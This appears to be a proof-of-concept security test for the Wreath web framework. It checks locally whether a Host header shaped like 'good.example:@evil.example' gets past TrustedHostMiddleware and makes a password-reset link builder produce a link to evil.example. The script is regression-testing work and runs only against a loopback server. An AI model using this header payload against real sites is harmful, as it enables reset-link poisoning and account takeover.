"""PoC: bypass TrustedHostMiddleware with a user-info-shaped Host value.

Run from the repository root::

    uv run python tests/security/poc_trusted_host_authority_confusion.py

The script binds only to loopback and drives Wreath through the metal event
loop and native HTTP/1 parser.  The application models a password-reset link
builder which relies on TrustedHostMiddleware before interpolating the Host
header.  A vulnerable build accepts ``good.example:@evil.example`` and emits a
link whose browser destination is ``evil.example``.
"""

from __future__ import annotations

import asyncio
import socket
import threading
from urllib.parse import urlsplit

from wreath import Wreath
from wreath.middleware import TrustedHostMiddleware
from wreath.reactor import metal_event_loop
from wreath.server import Server, ServerConfig


def _exchange(
    port: int,
    output: list[bytes],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
            client.sendall(
                b"GET /reset-link HTTP/1.1\r\n"
                b"Host: good.example:@evil.example\r\n"
                b"Connection: close\r\n\r\n"
            )
            response = bytearray()
            while part := client.recv(4096):
                response += part
            output.append(bytes(response))
    finally:
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> bytes:
    responses: list[bytes] = []
    loop = asyncio.get_running_loop()
    finished = asyncio.Event()
    thread = threading.Thread(
        target=_exchange,
        args=(port, responses, loop, finished),
    )
    thread.start()
    await finished.wait()
    thread.join()
    await server.close()
    return responses[0]


def main() -> int:
    app = Wreath()
    app.add_middleware(TrustedHostMiddleware(("good.example",)))

    @app.get("/reset-link")
    async def reset_link(request) -> str:
        return f"https://{request.header('host')}/reset?token=secret"

    loop = metal_event_loop(gc_mode="stock")
    try:
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("http/1.1",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(server._start(ssl=None, tls=None))
        port = server.sockets[0].getsockname()[1]
        response = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()

    status = response.partition(b"\r\n")[0]
    body = response.partition(b"\r\n\r\n")[2].decode("utf-8", "replace")
    destination = urlsplit(body).hostname
    vulnerable = status == b"HTTP/1.1 200 OK" and destination == "evil.example"
    print(status.decode("ascii", "replace"))
    print(body)
    print(f"browser destination: {destination}")
    print("VULNERABLE" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
